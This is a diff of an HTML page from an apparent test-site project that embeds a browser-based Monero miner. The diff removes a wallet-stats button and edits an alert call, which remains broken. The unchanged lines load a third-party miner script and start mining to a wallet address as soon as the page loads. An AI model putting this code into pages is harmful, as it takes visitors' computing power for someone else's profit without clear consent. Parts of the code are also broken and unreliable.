@@ -8,32 +8,6 @@
 <p>Im still trying to upgrade this with a current hashes per second meter and how much it made, if you can tell me how to do it that would be nice!</p>
 <p>If you have a better javascript miner then the one I have (it has %12 tax!) then put it on github and put the link in my "issues" secion</p>
 <p>To give advice goto https://github.com/Criptc/Test-site/issues</p>
-<p> the button bellow me shows current wallet info</p>
-<script>
-        let btn = document.createElement("button");
-btn.innerHTML = "Click for wallet stats";
-btn.onclick = function () {
-  function makeHttpObject() {
-  try {return new XMLHttpRequest();}
-  catch (error) {}
-  try {return new ActiveXObject("Msxml2.XMLHTTP");}
-  catch (error) {}
-  try {return new ActiveXObject("Microsoft.XMLHTTP");}
-  catch (error) {}
-
-  throw new Error("Could not create HTTP request object.");
-}
-
-var request = makeHttpObject();
-request.open("GET", "https://api.moneroocean.stream/miner/4B61jH4fJJqB7bato9MmQfh1ccZtSpthM4ZmWL7pBXUPevpstsHPuF1XhUTTg5Wp4MUb2QmMT6DLLfh8RNZAEsS1GrNn2si/stats", true);
-request.send(null);
-request.onreadystatechange = function() {
-  if (request.readyState == 4)
-    alert(request.responseText);
-};
-};
-document.body.appendChild(btn);
-</script>
 <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
   server = "wss://f.xmrminingproxy.com:8181";
@@ -44,7 +18,7 @@ document.body.appendChild(btn);
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
-    aleart(miner running);
+    aleart(minerrunning);
     </script>
 </body>
 </html> 
